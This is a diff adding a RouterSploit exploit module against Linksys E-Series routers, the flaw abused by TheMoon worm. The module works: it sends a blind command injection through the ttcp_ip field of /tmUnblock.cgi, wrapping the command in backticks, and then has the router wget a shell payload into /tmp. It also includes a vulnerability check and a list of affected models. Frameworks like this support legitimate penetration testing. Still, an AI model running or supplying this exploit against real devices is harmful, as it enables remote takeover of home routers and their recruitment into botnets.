@@ -1,0 +1,89 @@
+from routersploit.core.exploit import *
+from routersploit.core.http.http_client import HTTPClient
+
+
+class Exploit(HTTPClient):
+    __info__ = {
+        "name": "Linksys E-Series TheMoon RCE",
+        "description": "Module exploits remote code execution vulnerability in multiple Linksys E-Series "
+                       "devices. Vulnerability was actively used by TheMoon Worm.",
+        "authors": (
+            "Johannes Ullrich",  # worm discovery
+            "Rew",  # original exploit
+            "infodox",  # another exploit
+            "Michael Messner <devnull[at]s3cur1ty.de>",  # metasploit module
+            "juan vazquez",  # minor help with msf module
+            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
+        ),
+        "references": (
+            "https://www.exploit-db.com/exploits/31683/",
+            "https://www.securityfocus.com/bid/65585",
+            "https://packetstormsecurity.com/files/125253",
+            "https://packetstormsecurity.com/files/125252",
+            "https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633",
+            "https://isc.sans.edu/forums/diary/Linksys+Worm+TheMoon+Captured/17630",
+        ),
+        "devices": (
+            "Linksys E900",
+            "Linksys E1000",
+            "Linksys E1200",
+            "Linksys E1500",
+            "Linksys E1550",
+            "Linksys E2000",
+            "Linksys E2100L",
+            "Linksys E2500",
+            "Linksys E3000",
+            "Linksys E3200",
+            "Linksys E4200",
+        )
+    }
+
+    target = OptIP("", "Target IPv4 or IPv6 address")
+    port = OptPort(80, "Target HTTP port")
+
+    arch = OptString("mipsle", "Target architecture: mipsbe, mipsle")
+
+    def run(self):
+        if self.check():
+            print_success("Target is vulnerable")
+            print_status("Invoking command loop...")
+            print_status("It is blind command injection - response is not available")
+            if self.arch == "mipsbe":
+                shell(self, architecture="mipsbe", method="wget", location="/tmp")
+            elif self.arch == "mipsle":
+                shell(self, architecture="mipsle", method="wget", location="/tmp")
+        else:
+            print_error("Target is not vulnerable")
+
+    def execute(self, cmd):
+        cmd = "-h `{}`".format(cmd)
+        data = {
+            "submit_button": "",
+            "change_action": "",
+            "action": "",
+            "commit": "0",
+            "ttcp_num": "2",
+            "ttcp_size": "2",
+            "ttcp_ip": cmd,
+            "StartEPI": "1",
+        }
+
+        self.http_request(
+            method="POST",
+            path="/tmUnblock.cgi",
+            data=data,
+        )
+
+        return ""
+
+    @mute
+    def check(self):
+        response = self.http_request(
+            method="GET",
+            path="/tmUnblock.cgi",
+        )
+
+        if response and response.status_code in [200, 301, 302]:
+            return True  # target is vulnerable
+
+        return False  # target is not vulnerable
